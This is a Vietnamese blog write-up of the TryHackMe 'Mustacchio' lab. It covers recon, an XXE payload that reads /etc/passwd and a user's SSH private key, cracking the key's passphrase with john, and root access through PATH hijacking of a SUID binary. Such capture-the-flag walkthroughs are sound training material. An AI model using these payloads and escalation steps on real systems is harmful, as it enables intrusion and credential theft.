---
layout: post
author: "Neo"
title: "Tryhackme - Mustacchio"
date: "2021-12-31"
tags: [
    "tryhackme",
    "web",
    "linux",
    "burpsuite",
    "xxe",
    "ssh",
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-12-31-THM-Mustacchio/1.webp)

Xin chào, Lẩu đây. Hôm nay tôi quyết định làm thêm 1 machine dễ nữa: [Tryhackme - Mustacchio](https://tryhackme.com/room/mustacchio) 

## Reconnaissance

Việc đầu tiên, tất nhiên rồi, quét các cổng đang mở trên máy chủ mục tiêu

```python
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
|   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Mustacchio | Home
8765/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Với port 80 tôi có 1 web html và port 8765 là 1 trang đăng nhập. Thử khai thác web với port 80 trước. 

Dùng *__dirsearch__* để tìm web path

```python
[04:54:45] 200 -    3KB - /about.html                                       
[04:55:25] 200 -    1KB - /contact.html                                     
[04:55:27] 200 -    1KB - /custom/                                          
[04:55:38] 301 -  312B  - /fonts  ->  http://10.10.28.153/fonts/            
[04:55:40] 200 -    2KB - /gallery.html                                     
[04:55:44] 200 -    6KB - /images/                                          
[04:55:44] 301 -  313B  - /images  ->  http://10.10.28.153/images/
[04:55:46] 200 -    2KB - /index.html                                       
[04:56:21] 200 -   28B  - /robots.txt                                       
[04:56:24] 403 -  277B  - /server-status/                                   
[04:56:24] 403 -  277B  - /server-status     
```

Vào thư mục */custom/* tôi có 2 file là *moblie.js* và *users.bak*. Tôi tạm thời chưa quan tâm đến file js và tải file bak về trước.

```python
┌──(neo㉿kali)-[~]
└─$ cat users.bak 
��0]admin1868e36a6d2b17d4c2745f1659433a54d4******     
```

Sau *admin* có thể là password, nhìn sơ qua đoạn mã này giống md5. Decode nó và tôi có password của *admin*. Thử login vào port 8765

![login-port-8765](/assets/img/2021-12-31-THM-Mustacchio/2.webp)

Sử dụng BurpSuite để phân tích request xem có gì thú vị không

![burp](/assets/img/2021-12-31-THM-Mustacchio/3.webp)

Source web có 1 đoạn script ở đây và 1 dòng ẩn:

`<!-- Barry, you can now SSH in using your key!-->`

Với đoạn script, tôi có thêm 1 path mới: `/auth/dontfoget.bak`. Dùng web tải file này về

```python
┌──(neo㉿kali)-[~]
└─$ cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>                                                                                                                                                                                             
┌──(neo㉿kali)-[~]
└─$ 
```

Có vẻ như đây chính là form của comment ở web. Thử sao chép đoạn này vào comment và server trả về đúng như form

![form-comment](/assets/img/2021-12-31-THM-Mustacchio/4.webp)

Sau 1 lúc tìm kiếm cách khai thác lỗi sử dụng XXE, tôi tìm được payload ở [đây](https://github.com/payloadbox/xxe-injection-payload-list). Sửa đoạn xml mẫu 1 chút, tôi sẽ lấy file từ server và thay comment là 1 câu lệnh để server đọc và in nội dung file ra cho tôi.

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&read;</com>
</comment>
```

![comment](/assets/img/2021-12-31-THM-Mustacchio/5.webp)

Có vẻ là hơi khó đọc, tôi sẽ quay lại Burp

![cat /etc/passwd](/assets/img/2021-12-31-THM-Mustacchio/6.webp)

Để thực thi được lệnh, tôi phải chuyển nó về dạng url. Sau 1 lúc bế tắc thì tôi nhận ra còn 1 hint nữa mà tôi chưa dùng đến, là ssh key của Barry. Thông thường ssh key sẽ nằm trong thư mục *.ssh* trong thư mục user, vậy thì đường dẫn file có thể sẽ giống như thế này: 

`/home/barry/.ssh/id_rsa`

Thay path này vào */etc/passwd* và encode nó thành url

![id_rsa](/assets/img/2021-12-31-THM-Mustacchio/7.webp)

## SSH

Sao chép ssh key về và login ssh với key này. Tuy nhiên khi login tôi cần passphrase. Sử dụng *john* để brute-force passphrase

```python
┌──(neo㉿kali)-[~]
└─$ ssh2john id_rsa > hash                                                                   
             
┌──(neo㉿kali)-[~]
└─$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
```

Login vào SSH với port 22 

```python
┌──(neo㉿kali)-[~]
└─$ ssh -i id_rsa barry@10.10.82.130
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ 
```

## Privilege escalation

Tôi thử tìm SUID

`find / -type f -perm -u=s 2>/dev/null`

```python
barry@mustacchio:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

Tôi để ý có 1 file đặc biệt là */home/joe/live_log*, khi xem qua nó thì đây là 1 file binary. Dùng `strings` để phân tích nội dung

```python
barry@mustacchio:/home/joe$ strings live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

Khi chạy file này, nó sẽ gọi đến file *access.log* và in log ra theo thời gian thực, và vì file binary này chạy với quyền *root* nên tôi có thể leo thang đặc quyền với file này mà không cần `sudo`.

Tôi sẽ sử dụng kỹ thuật giống như đã trình bày ở CTF [Tryhackme - Wonderland](https://re-toor.me/posts/thm-wonderland), đến thư mục */tmp* vì nó có toàn quyền ghi và thực thi file. Sau đó tạo 1 file *tail* chứa lệnh thực thi, set quyền thực thi cho nó, thêm path */tmp* vào đầu biến *PATH* để khi chạy file *live_log* trong đây, nó sẽ gọi ngay đến *tail* vừa tạo.

Nó sẽ như thế này 

```python
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod 777 tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ /home/joe/live_log 
root@mustacchio:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
root@mustacchio:/tmp# ls /root
root.txt
root@mustacchio:/tmp# 
```

Hoàn thành!
